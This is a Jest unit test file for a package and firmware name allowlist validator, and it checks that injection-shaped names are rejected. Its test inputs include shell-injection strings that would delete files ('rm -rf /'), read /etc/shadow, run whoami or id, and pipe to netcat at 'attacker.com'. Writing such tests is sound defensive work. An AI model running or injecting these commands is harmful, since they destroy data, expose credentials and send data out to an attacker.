/*
 * Copyright ©2025 HP Development Company, L.P.
 * Licensed under the X11 License. See LICENSE file in the project root for details.
 */

/**
 * Unit tests for the F-3 package/firmware name allowlist.
 */

import { isValidPackageName, assertValidPackageNames } from '../../utils/packageName';

describe('isValidPackageName', () => {
    it('accepts plausible apt/dnf/zypper package names', () => {
        expect(isValidPackageName('curl')).toBe(true);
        expect(isValidPackageName('nvidia-driver-550')).toBe(true);
        expect(isValidPackageName('linux-firmware')).toBe(true);
        expect(isValidPackageName('libssl3')).toBe(true);
        expect(isValidPackageName('python3.11')).toBe(true);
        expect(isValidPackageName('lib32gcc-s1')).toBe(true);
    });

    it('accepts a hex-GUID-shaped fwupd DeviceId', () => {
        expect(isValidPackageName('a1b2c3d4-e5f6-4789-a0b1-c2d3e4f5a6b7')).toBe(true);
    });

    it('rejects names containing shell metacharacters', () => {
        expect(isValidPackageName('curl; rm -rf /')).toBe(false);
        expect(isValidPackageName('curl`whoami`')).toBe(false);
        expect(isValidPackageName('curl$(id)')).toBe(false);
        expect(isValidPackageName('curl && cat /etc/shadow')).toBe(false);
        expect(isValidPackageName('curl\nrm -rf /')).toBe(false);
        expect(isValidPackageName('curl pkg2')).toBe(false);
        expect(isValidPackageName('curl|nc attacker.com 4444')).toBe(false);
    });

    it('rejects empty string and names starting with a non-alphanumeric character', () => {
        expect(isValidPackageName('')).toBe(false);
        expect(isValidPackageName('-curl')).toBe(false);
        expect(isValidPackageName('.curl')).toBe(false);
    });

    it('rejects names beyond the length cap', () => {
        expect(isValidPackageName('a'.repeat(257))).toBe(false);
        expect(isValidPackageName('a'.repeat(256))).toBe(true);
    });
});

describe('assertValidPackageNames', () => {
    it('does not throw when every name is valid', () => {
        expect(() => assertValidPackageNames(['curl', 'libssl3', 'nvidia-driver-550'])).not.toThrow();
    });

    it('throws listing the offending name(s) when any name is invalid', () => {
        expect(() => assertValidPackageNames(['curl', 'pkg; rm -rf /'])).toThrow(/pkg; rm -rf \//);
    });

    it('throws when any of several injection-shaped names is present', () => {
        const attempts = ['curl`whoami`', 'pkg$(id)', 'a && b', 'has space'];
        for (const bad of attempts) {
            expect(() => assertValidPackageNames(['curl', bad])).toThrow();
        }
    });

    it('does not throw for an empty list', () => {
        expect(() => assertValidPackageNames([])).not.toThrow();
    });
});
